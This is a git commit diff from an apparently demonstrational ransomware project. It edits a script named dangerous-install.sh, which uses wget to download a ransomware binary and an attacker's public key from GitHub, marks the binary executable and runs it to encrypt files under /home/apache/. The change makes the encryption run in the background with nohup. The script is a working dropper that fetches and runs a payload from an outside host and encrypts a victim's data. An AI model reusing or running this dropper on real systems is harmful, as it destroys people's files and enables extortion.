1125aa88c59b6cdadcfb7b3a94d725316a845939
soonann <sudo@soonann.dev>
2024-03-23 14:42:01 +0800

    chore: make encryption run in bg

--- ransomware/scripts/dangerous-install.sh
+++ ransomware/scripts/dangerous-install.sh
@@ -3,4 +3,4 @@ wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/
 wget https://github.com/yet-another-ransomware-demo/yet-another-ransomware-demo/raw/main/attacker/public_key.pem -O /tmp/public_key.pem
 chmod +x /tmp/ransomware
 export DISPLAY=:1.0
-/tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-key /tmp/
+nohup /tmp/ransomware --pub /tmp/public_key.pem --path /home/apache/ --enc-sym-key /tmp/ > /tmp/logs &
